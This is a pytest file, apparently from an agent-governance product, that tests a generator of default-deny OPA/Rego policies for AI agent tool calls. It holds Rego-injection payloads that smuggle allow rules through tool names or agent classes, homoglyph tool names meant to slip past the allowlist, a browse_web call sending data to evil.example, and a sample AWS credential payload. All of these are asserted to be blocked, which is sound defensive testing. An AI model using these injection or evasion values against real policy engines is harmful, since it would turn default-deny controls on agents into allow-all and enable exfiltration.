# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""Attack Graph positive-security intent generator (feat/attack-graph).

The security-critical guarantee: the GENERATED intent policy is DEFAULT-DENY and tighten-only — a call is
allowed only when it matches the class AND every enabled constraint, and the canonical baseline-blocked
attacks (delete / SQL exec / egress / cross-tenant) stay BLOCKED. We prove behaviour by evaluating the
generated rego with the real `opa` binary (v0-compatible), the same engine the PEP uses."""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from norviq.engine.capability.source_registry import classify_tool
from norviq.engine.evaluator import OPAEvaluator

from norviq.api.threat_intent import (
    Intent,
    generate_intent_rego,
    mitre_for_tool,
    opa_input_for_step,
    recommended_fix,
    sanitize_class,
)

_OPA = shutil.which("opa")
pytestmark = pytest.mark.skipif(_OPA is None, reason="opa binary not installed")

CLS = "customer-support"


def _decide(rego: str, opa_input: dict) -> str:
    """Evaluate `data.norviq.intent.<pkg>.decision` for one input via `opa eval` (v0-compatible)."""
    pkg = f"norviq.intent.{sanitize_class(CLS)}"
    with tempfile.TemporaryDirectory() as d:
        rp, ip = Path(d) / "p.rego", Path(d) / "i.json"
        rp.write_text(rego)
        ip.write_text(json.dumps(opa_input))
        out = subprocess.run(
            [_OPA, "eval", "--v0-compatible", "-d", str(rp), "-i", str(ip), f"data.{pkg}.decision"],
            capture_output=True, text=True, check=True,
        )
    doc = json.loads(out.stdout)
    return doc["result"][0]["expressions"][0]["value"]


def _inp(tool: str, ns: str = "payments", cls: str = CLS, params: dict | None = None) -> dict:
    return opa_input_for_step(tool, ns, cls, params or {})


def test_allowlisted_allowed_others_denied():
    """The allowlist is the intended tool set — those tools are allowed, every other tool is default-denied."""
    rego = generate_intent_rego(CLS, ["search_kb", "get_order"], Intent())
    assert _decide(rego, _inp("search_kb")) == "allow"
    assert _decide(rego, _inp("get_order")) == "allow"
    assert _decide(rego, _inp("delete_record")) == "block"   # not allowlisted
    assert _decide(rego, _inp("send_email")) == "block"      # not allowlisted
    assert _decide(rego, _inp("execute_sql")) == "block"


def test_homoglyph_of_allowlisted_matches_but_others_dont():
    """Evasion-normalized allow: a homoglyph of an allowlisted tool still matches (same intent); a homoglyph
    of a NON-allowlisted tool is still denied (can't smuggle a non-intended tool past the allow)."""
    rego = generate_intent_rego(CLS, ["search_kb"], Intent())
    assert _decide(rego, _inp("search_kb")) == "allow"
    assert _decide(rego, _inp("ѕearch_kb")) == "allow"   # Cyrillic 'ѕ' → skeleton == search_kb
    assert _decide(rego, _inp("SEARCH_KB")) == "allow"        # case-folded
    assert _decide(rego, _inp("dеlete_record")) == "block"  # homoglyph of a non-allowlisted tool


def test_toggles_refine_allowlisted_tools():
    """Toggles are refinements ON TOP of the allowlist: a checked WRITE/EGRESS/cross-ns tool is still denied."""
    ro = generate_intent_rego(CLS, ["search_kb", "update_ledger"], Intent(readonly=True))
    assert _decide(ro, _inp("search_kb")) == "allow"          # allowlisted read
    assert _decide(ro, _inp("update_ledger")) == "block"      # allowlisted but not a read → refined out

    eg = generate_intent_rego(CLS, ["search_kb", "send_email"], Intent(egress=True))
    assert _decide(eg, _inp("send_email")) == "block"         # allowlisted but egress → refined out
    assert _decide(eg, _inp("search_kb")) == "allow"

    sc = generate_intent_rego(CLS, ["get_user"], Intent(scope=True))
    assert _decide(sc, _inp("get_user", params={"namespace": "payments"})) == "allow"
    assert _decide(sc, _inp("get_user", params={"namespace": "hr"})) == "block"  # cross-ns → refined out


def test_default_deny_for_other_class_and_empty_allowlist():
    rego = generate_intent_rego(CLS, ["search_kb"], Intent())
    assert _decide(rego, _inp("search_kb", cls="batch")) == "block"  # other class → default deny
    empty = generate_intent_rego(CLS, [], Intent())
    assert _decide(empty, _inp("search_kb")) == "block"              # empty allowlist → deny everything


@pytest.mark.parametrize("tool", ["delete_record", "drop_table", "execute_sql", "send_email", "http_post"])
def test_dangerous_tools_not_allowlisted_are_blocked(tool):
    """Dangerous tools that are NOT in the allowlist are default-denied — the generated policy only ADDS
    denials over the baseline. (Non-weakening vs the baseline at equal priority is proven in
    test_intent_tighten_only.py.)"""
    rego = generate_intent_rego(CLS, ["search_kb", "get_order"], Intent(readonly=True))
    assert _decide(rego, _inp(tool)) == "block"


def test_learned_verbs_override_the_name_heuristic():
    """PROMOTED verbs flow into generation: a tool learned as delete FAILS Read-only whatever its name
    says; a tool learned as read PASSES Read-only despite an opaque name; a tool learned as send is an
    egress sink. The admin's promotion — not the name — is the authority."""
    # 'warehouse_task' says nothing; learned delete ⇒ Read-only refines it OUT.
    ro = generate_intent_rego(CLS, ["search_kb", "warehouse_task"], Intent(readonly=True),
                              learned_verbs={"warehouse_task": "delete"})
    assert "warehouse_task=delete" in ro          # the draft names its learned inputs
    assert _decide(ro, _inp("search_kb")) == "allow"
    assert _decide(ro, _inp("warehouse_task")) == "block"

    # same opaque name learned as READ ⇒ passes Read-only.
    ro2 = generate_intent_rego(CLS, ["warehouse_task"], Intent(readonly=True),
                               learned_verbs={"warehouse_task": "read"})
    assert _decide(ro2, _inp("warehouse_task")) == "allow"

    # learned send ⇒ egress sink for the No-egress toggle.
    eg = generate_intent_rego(CLS, ["warehouse_task"], Intent(egress=True),
                              learned_verbs={"warehouse_task": "send"})
    assert _decide(eg, _inp("warehouse_task")) == "block"

    # a "get_..."-named tool the admin corrected to delete must NOT sneak through Read-only by its name.
    ro3 = generate_intent_rego(CLS, ["get_snapshot"], Intent(readonly=True),
                               learned_verbs={"get_snapshot": "delete"})
    assert _decide(ro3, _inp("get_snapshot")) == "block"


# Reads the registry publishes as `derived.verb == "send"` because it takes the WORST verb over ALL of a
# name's tokens and `mail`/`email`/`sync`/`export` are SEND tokens. Every one is an ordinary read.
_CLASSIFIED_SEND_READS = ["get_mail", "list_mail", "read_email_thread", "get_sync_status", "download_export"]
# The sinks the toggle exists to refuse. Ordinary vendor names, absent from the 18 literal EGRESS_TOOLS.
_VENDOR_SINKS = ["forward_ticket", "slack_post_message", "relay_case", "dispatch_report", "share_summary"]


def _inp_with_derived(tool: str, params: dict | None = None, verb: str | None = None) -> dict:
    """`opa_input_for_step` + the engine's real `input.derived`, optionally with an admin-PROMOTED verb.

    The generated policy reads `input.derived.verb`, and `opa_input_for_step` does not publish it — so a
    test built only from that helper cannot see this rule at all. Derived is computed by the real
    `_derived_input` rather than hand-written so the test tracks the engine."""
    doc = _inp(tool, params=params or {})
    derived = OPAEvaluator.__new__(OPAEvaluator)._derived_input(
        SimpleNamespace(tool_name=tool, tool_params=params or {}, agent_identity=None)
    )
    if verb is not None:
        derived["verb"] = verb
    doc["derived"] = derived
    return doc


@pytest.mark.parametrize("tool", _CLASSIFIED_SEND_READS)
def test_the_no_egress_toggle_does_not_refuse_ordinary_reads(tool):
    """The cost side of reading `derived.verb`. "No external egress" generates a DEFAULT-DENY policy in
    which `not is_egress` gates the allow directly — there is no payload predicate to soften it — so a
    read misclassified as a sink is REFUSED OUTRIGHT on an allowlist the operator authored themselves.
    Measured before the fix: 8 of these 10 allowlisted tools flipped to
    ("block", "intent_refinement_mismatch") and only 2 of the 8 were the intended egress refusals."""
    verb, _risk = classify_tool(tool)
    assert verb.value == "send", (
        f"{tool} is no longer classified send, so this test no longer exercises the disagreement it "
        "exists for — pick a name the registry still over-classifies"
    )
    rego = generate_intent_rego(CLS, _CLASSIFIED_SEND_READS + _VENDOR_SINKS + ["search_kb"], Intent(egress=True))
    assert _decide(rego, _inp_with_derived(tool, {"folder": "INBOX"})) == "allow"


@pytest.mark.parametrize("tool", _VENDOR_SINKS)
def test_the_no_egress_toggle_still_refuses_vendor_sinks(tool):
    """The other half, pinned in the same file so restoring the reads can never be done by giving the
    toggle up. These names are absent from the 18 literal EGRESS_TOOLS and are why it reads derived."""
    rego = generate_intent_rego(CLS, _CLASSIFIED_SEND_READS + _VENDOR_SINKS + ["search_kb"], Intent(egress=True))
    assert _decide(rego, _inp_with_derived(tool, {"id": "t1"})) == "block"


@pytest.mark.parametrize("tool", _VENDOR_SINKS)
def test_a_read_promotion_cannot_demote_a_named_sink(tool):
    """A promotion may RAISE a verb. It may never LOWER one.

    `POST /threats/tool-verbs/promote {"verb": "read"}` did both halves of the damage in one step: the
    generator emitted the tool into `learned_read`, satisfying the Read-only toggle, and the engine
    rewrote `input.derived.verb` to "read", falsifying `is_egress`. A readonly+egress default-deny
    policy therefore returned ("allow", "intent_allow_customer_support") for a tool the registry calls
    (SEND, HIGH) — measured. The promote endpoint's candidate LISTING only offers UNKNOWN tools, but its
    WRITE path validates only that the verb is one of read/write/send/delete, so the generator refuses
    the demotion rather than assuming it was never asked for."""
    rego = generate_intent_rego(
        CLS, [tool, "search_kb"], Intent(readonly=True, egress=True), learned_verbs={tool: "read"}
    )
    assert f"{tool}=read" not in rego, "the refused promotion must not be emitted as a learned read"
    assert "REFUSED promotions" in rego and tool in rego, (
        "a discarded promotion has to be visible in the draft — an operator who promoted a verb and saw "
        "no change deserves the reason"
    )
    # Both the promotion's own effect (verb == "read") and the toggle it was meant to satisfy.
    assert _decide(rego, _inp_with_derived(tool, {"channel": "C1", "text": "hi"}, verb="read")) == "block"


def test_a_read_promotion_on_an_opaque_name_still_works():
    """The refusal is scoped to names that already say what they are. The case the promotion exists for
    — an opaque vendor name the classifier returned UNKNOWN for — must keep working, or this is a
    regression dressed as a fix."""
    rego = generate_intent_rego(CLS, ["warehouse_task"], Intent(readonly=True),
                                learned_verbs={"warehouse_task": "read"})
    assert "warehouse_task=read" in rego
    assert _decide(rego, _inp_with_derived("warehouse_task", verb="read")) == "allow"
    # …including its camelCase spelling, which the refusal must not mistake for evidence.
    camel = generate_intent_rego(CLS, ["warehouseTask"], Intent(readonly=True),
                                 learned_verbs={"warehouseTask": "read"})
    assert "warehousetask=read" in camel
    assert _decide(camel, _inp_with_derived("warehouseTask", verb="read")) == "allow"


# The same tools one rename later. `_tokenize_tool` splits on separators AND camelCase, so each of these
# classifies exactly like its snake_case twin — while `name.lower()` and `split(name, "_")` see one
# opaque token. Everything this file pins was therefore pinned for snake_case only.
_CAMEL_READS = ["getMail", "listMail", "readEmailThread", "getSyncStatus", "downloadExport"]
_CAMEL_SINKS = ["postMessage", "sendEmail", "forwardTicket", "relayCase", "shareSummary"]
# A promotion to `read` on a MUTATION is the same class of demotion as one on a sink.
_CAMEL_MUTATIONS = ["createIssue", "deleteRecord", "updateSubscription"]


@pytest.mark.parametrize("tool", _CAMEL_READS)
def test_the_no_egress_toggle_does_not_refuse_reads_spelled_in_camel_case(tool):
    """The over-block fix, one rename later: `getMail` was still ("block","intent_refinement_mismatch")
    on an allowlist the operator wrote themselves, because the generated `is_retrieval_lead` split the
    name on `_` while the classification it was reading had been decided on camelCase boundaries."""
    verb, _risk = classify_tool(tool)
    assert verb.value == "send", f"{tool} must still be over-classified for this case to mean anything"
    rego = generate_intent_rego(CLS, _CAMEL_READS + _CAMEL_SINKS + ["search_kb"], Intent(egress=True))
    assert _decide(rego, _inp_with_derived(tool, {"folder": "INBOX"})) == "allow"


@pytest.mark.parametrize("tool", _CAMEL_SINKS)
def test_the_no_egress_toggle_still_refuses_sinks_spelled_in_camel_case(tool):
    """The half that must never be given up to buy the half above."""
    rego = generate_intent_rego(CLS, _CAMEL_READS + _CAMEL_SINKS + ["search_kb"], Intent(egress=True))
    assert _decide(rego, _inp_with_derived(tool, {"id": "t1"})) == "block"


@pytest.mark.parametrize("tool", _CAMEL_SINKS + _CAMEL_MUTATIONS)
def test_a_read_promotion_cannot_demote_a_camel_cased_name(tool):
    """The refusal read the LOWERCASED key, and lowercasing is what destroys the camelCase boundary that
    says what the tool does. `"createIssue".lower()` is one opaque token, so `read_promotion_would_demote`
    found no evidence and the demotion was accepted: measured, the Read-only toggle then returned
    ("allow","intent_allow_customer_support") for `postMessage`, `sendEmail`, `forwardTicket`,
    `createIssue` and `deleteRecord` carrying the AWS credential payload — the exact verdict the same
    promotion on `slack_post_message` / `delete_record` is refused for.

    Deliberately the READ-ONLY toggle ALONE: with no-egress also on, `is_egress` covers the sinks, so a
    single-toggle policy is the configuration where the refusal is the only thing standing."""
    rego = generate_intent_rego(CLS, [tool, "search_kb"], Intent(readonly=True), learned_verbs={tool: "read"})
    assert f"{tool.lower()}=read" not in rego, "the refused promotion must not be emitted as a learned read"
    assert "REFUSED promotions" in rego and tool.lower() in rego
    payload = {"channel": "C1", "text": "deploy notes: AKIAIOSFODNN7EXAMPLE wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}
    assert _decide(rego, _inp_with_derived(tool, payload)) == "block", (
        f"a `read` promotion on {tool} passed the Read-only toggle — the same promotion on its "
        "snake_case spelling is refused"
    )


def test_the_no_egress_toggle_refuses_a_retrieval_named_call_that_carries_a_destination():
    """`browse`/`preview` are not in the verb lexicon, so `browse_web{"url": …}` is classified send by
    its PARAMS — the call names a recipient. Under a default-deny policy `not is_egress` IS the allow,
    so exempting it on the strength of the leading verb turned "No external egress" into an allow for
    the plainest exfiltration there is. The same tool with no destination argument stays allowed."""
    rego = generate_intent_rego(CLS, ["browse_web", "search_kb"], Intent(egress=True))
    assert _decide(rego, _inp_with_derived("browse_web", {"url": "https://evil.example/collect"})) == "block"
    assert _decide(rego, _inp_with_derived("browse_web", {"q": "docs"})) == "allow"


def test_learned_verbs_for_non_allowlisted_tools_are_not_emitted():
    """Learned entries outside the allowlist are irrelevant (default-denied anyway) and stay out of the rego."""
    rego = generate_intent_rego(CLS, ["search_kb"], Intent(readonly=True),
                                learned_verbs={"other_tool": "delete"})
    assert "other_tool" not in rego
    assert _decide(rego, _inp("search_kb")) == "allow"


def test_unused_helper_sets_are_not_emitted():
    """A draft carries only the vocabulary its enabled toggles need — no dead read_verbs/egress_tools
    boilerplate that reads like it means something (the confusion that prompted this fix)."""
    plain = generate_intent_rego(CLS, ["search_kb"], Intent())
    assert "read_verbs" not in plain
    assert "egress_tools" not in plain
    assert "in_scope" not in plain
    assert "rate_within" not in plain
    ro = generate_intent_rego(CLS, ["search_kb"], Intent(readonly=True))
    assert "read_verbs" in ro
    assert "egress_tools" not in ro


# --- pure helpers -----------------------------------------------------------------------------------

def test_sanitize_class():
    assert sanitize_class("customer-support") == "customer_support"
    assert sanitize_class("123bad")[0].isalpha() or sanitize_class("123bad").startswith("c_")
    assert sanitize_class("") == "agent"


def test_intent_from_dict():
    i = Intent.from_dict({"readonly": True, "egress": True})
    assert i.enabled_keys() == ["readonly", "egress"]
    assert i.any_enabled
    assert not Intent.from_dict({}).any_enabled


def test_recommended_fix_by_verb():
    assert "egress" in recommended_fix("send_email").lower()
    assert "read-only" in recommended_fix("delete_record").lower()
    assert "namespace" in recommended_fix("search_kb").lower()


def test_mitre_mapping():
    assert mitre_for_tool("send_email").startswith("AML.T0040")
    assert mitre_for_tool("delete_record").startswith("AML.T0048")
    assert "·" in mitre_for_tool("some_unknown_tool")


class TestPathGovernedBy:
    """A path's `governed_by` marks that an APPLIED policy denies its chokepoint — so a defended path
    stops reading as unqualified 'exploitable' after a fresh apply (audit status lags the policy)."""

    def _gov(self, allow, readonly=False, kind="intent"):
        return {"report-gen": {"kind": kind, "allow": set(allow), "readonly": readonly}}

    def test_chokepoint_not_in_allowlist_is_governed(self):
        from norviq.api.routers.threats import _path_governed_by
        # default-deny: a tool NOT allowlisted is denied ⇒ governed.
        assert _path_governed_by(self._gov([]), "report-gen", "warehouse_task", "delete") == "intent"

    def test_allowlisted_permitted_tool_is_NOT_governed(self):
        from norviq.api.routers.threats import _path_governed_by
        # allowlisted + no read-only ⇒ the policy PERMITS it ⇒ honestly NOT governed (still exploitable).
        assert _path_governed_by(self._gov(["warehouse_task"]), "report-gen", "warehouse_task", "delete") == ""

    def test_allowlisted_but_readonly_refines_out_mutating(self):
        from norviq.api.routers.threats import _path_governed_by
        # allowlisted + read-only ⇒ a mutating verb is refined out ⇒ governed.
        assert _path_governed_by(self._gov(["warehouse_task"], readonly=True), "report-gen", "warehouse_task", "delete") == "intent"
        # a READ tool stays permitted under read-only ⇒ not governed.
        assert _path_governed_by(self._gov(["read_kb"], readonly=True), "report-gen", "read_kb", "read") == ""

    def test_capability_policy_is_a_forward_guard(self):
        from norviq.api.routers.threats import _path_governed_by
        assert _path_governed_by(self._gov([], kind="capability"), "report-gen", "anything", "delete") == "capability"

    def test_no_policy_for_class(self):
        from norviq.api.routers.threats import _path_governed_by
        assert _path_governed_by({}, "report-gen", "warehouse_task", "delete") == ""


# --- Rego injection ------------------------------------------------------------------------------
#
# Every value reaching generated Rego is escaped at the point of emission (`_rego_string` and its two
# siblings in threat_intent.py). Before that, a tool name or an agent class was pasted straight into a
# string literal as f'"{v}"', so a value carrying a quote could close the literal and open a rule.
#
# This is the one policy in the product whose whole purpose is DEFAULT-DENY. Turning it into
# allow-everything is not a degradation of the control, it is its inversion — and the generated draft
# still reads as default-deny in the console, because the injected rule sits below the header saying
# so and the module compiles cleanly, so the policy validator accepts it on apply.
#
# The payloads below are the ones that actually WORKED against the unescaped generator, verified by
# evaluating the generated module with the real opa binary. An earlier attempt with `allow { true }`
# did nothing: the rule the policy gates on is `allow_intent`, not `allow`, so a payload that reads
# like an exploit is not one. Targeting the wrong rule is how this would have been written off.

_INJECTION_PAYLOADS = [
    pytest.param('a"} allow_intent { true } unused := {"', id="defines-allow_intent"),
    pytest.param('a"} in_allowlist { true } unused := {"', id="defines-in_allowlist"),
    pytest.param('a"} in_allowlist { input.tool_name } unused := {"', id="in_allowlist-via-input"),
]


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_a_crafted_tool_name_cannot_turn_default_deny_into_allow(payload: str):
    rego = generate_intent_rego(CLS, ["get_report", payload], Intent())
    assert _decide(rego, _inp("exfiltrate_all")) == "block", (
        "a tool name escaped its string literal and added a rule — the default-deny allowlist policy "
        "now allows a tool nobody put on the allowlist"
    )


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_a_crafted_agent_class_cannot_turn_default_deny_into_allow(payload: str):
    """Same hole, different field. The class is interpolated at four sites including two comments."""
    cls = CLS + payload
    rego = generate_intent_rego(cls, ["get_report"], Intent())
    pkg = f"norviq.intent.{sanitize_class(cls)}"
    with tempfile.TemporaryDirectory() as d:
        rp, ip = Path(d) / "p.rego", Path(d) / "i.json"
        rp.write_text(rego)
        ip.write_text(json.dumps(opa_input_for_step("exfiltrate_all", "payments", cls, {})))
        out = subprocess.run(
            [_OPA, "eval", "--v0-compatible", "-d", str(rp), "-i", str(ip), f"data.{pkg}.decision"],
            capture_output=True, text=True, check=True,
        )
    assert json.loads(out.stdout)["result"][0]["expressions"][0]["value"] == "block"


def test_the_injection_tests_can_tell_allow_from_block():
    """The control arm. Every assertion above is `== "block"`, which a generator that emitted a
    syntactically broken module (or nothing at all) would also satisfy for the wrong reason. So pin
    that the same harness reports `allow` when the policy really does allow."""
    rego = generate_intent_rego(CLS, ["get_report"], Intent())
    assert _decide(rego, _inp("get_report")) == "allow"
    assert _decide(rego, _inp("exfiltrate_all")) == "block"
